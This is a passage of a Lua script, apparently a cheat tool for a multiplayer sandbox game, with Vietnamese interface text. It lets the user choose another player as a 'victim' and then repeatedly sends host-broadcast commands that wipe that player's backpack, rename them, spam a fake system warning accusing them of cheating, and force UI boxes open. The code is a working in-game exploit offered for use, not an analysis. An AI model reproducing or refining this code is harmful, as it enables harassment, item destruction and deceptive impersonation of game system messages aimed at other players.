                                end)
                            end
                        end
                    end
                    
                    print("Đã dừng tấn công")
                    _G.dffz_thread = nil
                end)
            end
        end
    )
end

function nhatduongchi()
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng tấn công\nBắt đầu tấn công và chọn mục tiêu\n(Xóa balo + Spam cảnh báo + Auto-kill)",
        "Tấn công tổng hợp",
        nil,
        function(userData, btnType)
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Chưa vào phòng!")
                _G.dtms_enabled = false
                return
            end
            if btnType == 0 then
                _G.dtms_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng toàn bộ tấn công")
            elseif btnType == 1 then
                _G.dtms_enabled = true

                LoadHomelandLuas()
                local uin_list = GetPlayerUinList()
                if #uin_list == 0 then
                    ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác trong phòng")
                    _G.dtms_enabled = false
                    return
                end

                local data = {
                    visit = {
                        history_num = "Chọn mục tiêu",
                        today_num = "#cFF7aad" .. #uin_list
                    },
                    event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                    event_visit = {}
                }
                for i = 1, #uin_list do
                    data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
                end

                GetInst("UIManager"):Open("HomeEventRecord")
                GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
                getglobal("HomeEventRecordTitleFrameName"):SetText("Chọn nạn nhân")
                getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadNgười chơi trong phòng")
                getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để tấn công tổng hợp")

                local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
                local originalFunc = ctrl.EnterFriendHomeBtn_OnClick

                function ctrl:EnterFriendHomeBtn_OnClick()
                    GetInst("UIManager"):Close("HomeEventRecord")
                    ctrl.EnterFriendHomeBtn_OnClick = originalFunc

                    local targetUin = this:GetClientID()
                    ShowGameTipsWithoutFilter("#c00ffffĐã chọn: " .. targetUin .. ", bắt đầu tấn công tổng hợp!")
                    ShowGameTipsWithoutFilter("#cFFAA00[Xóa balo + Spam cảnh báo + Auto-kill]")

                    threadpool:work(function()
                        local myUin = AccountManager:getUin()
                        local loopCount = 0
                        local setNick = {
                            [1] = "actor",
                            [2] = "setnickname",
                            [3] = {targetUin, '#RTuất'}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setNick)
                        end)
                        while _G.dtms_enabled do
                            loopCount = loopCount + 1

                            -- ===== 1. XÓA BALO =====
                            local clearBalo = {
                                [1] = "backpack",
                                [2] = "clearAllPack",
                                [3] = { targetUin }
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBalo)
                            end)

                            -- ===== 2. SPAM CẢNH BÁO (mỗi 3 lần gửi 1 tin) =====
                            if loopCount % 3 == 0 then
                                local warnMsg = {
                                    [1] = "player",
                                    [2] = "notifyGameInfo2Self",
                                    [3] = { targetUin, "#R Hệ thống phát hiện bạn có hành vi gian lận" }
                                }
                                pcall(function()
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, warnMsg)
                                end)
                            end

                            -- ===== 3. FORCE OPEN UI 797 =====
                            local tdata = {}
                            tdata[1] = "player"
                            tdata[2] = "forceOpenBoxUI"
                            tdata[3] = {targetUin, 797}
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            end)
                            

                            -- Thông báo tiến độ
                            if loopCount % 20 == 0 then
                                ShowGameTipsWithoutFilter("#c00ffffĐã tấn công " .. loopCount .. " lần")
                            end

                            -- ===== 5. FORCE OPEN UI 798 =====
                            local tdata2 = {}
                            tdata2[1] = "player"
                            tdata2[2] = "forceOpenBoxUI"
                            tdata2[3] = {targetUin, 798}
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
                            end)
                            
                            threadpool:wait(0.3)
                        end

                        -- Khôi phục quyền tấn công
                        local enableAttack = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {targetUin, 32, true}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                        end)
                        ShowGameTipsWithoutFilter("#cFF0000Đã dừng tấn công và khôi phục mục tiêu")
                    end)
                end
            end
        end
    )
end
